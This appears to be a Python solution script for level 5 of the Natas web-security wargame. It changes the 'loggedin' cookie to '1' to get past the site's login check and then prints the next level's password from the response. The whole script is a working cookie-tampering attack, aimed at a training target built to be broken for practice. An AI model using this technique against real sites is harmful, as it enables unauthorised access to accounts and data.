import requests
from requests.auth import HTTPBasicAuth
import natas

print("Natas 5")

challNumber = 5
user, password, url = natas.initLevel(challNumber)
print("[+] Request to "+url)

# Create a session to get cookies
session = requests.Session()

# First request 
res = session.get(url, auth=HTTPBasicAuth(user, password))

# Display cookies 
print("[+] Received cookies : ")
print(session.cookies.get_dict())

# Do not success to modify the cookies in the session object.
# Modify cookies with classic dict
cookies = dict(session.cookies.get_dict())
print("[+] Setting value \"1\" to cookie \"loggedin\".")
cookies["loggedin"] = "1"

# Set a second request with modified cookies
res = requests.get(url, auth=HTTPBasicAuth(user, password), cookies=cookies)

# Try to find "password" in response text
resTab = res.text.split('\n')
for line in resTab:
	if "password" in line :
		print(line)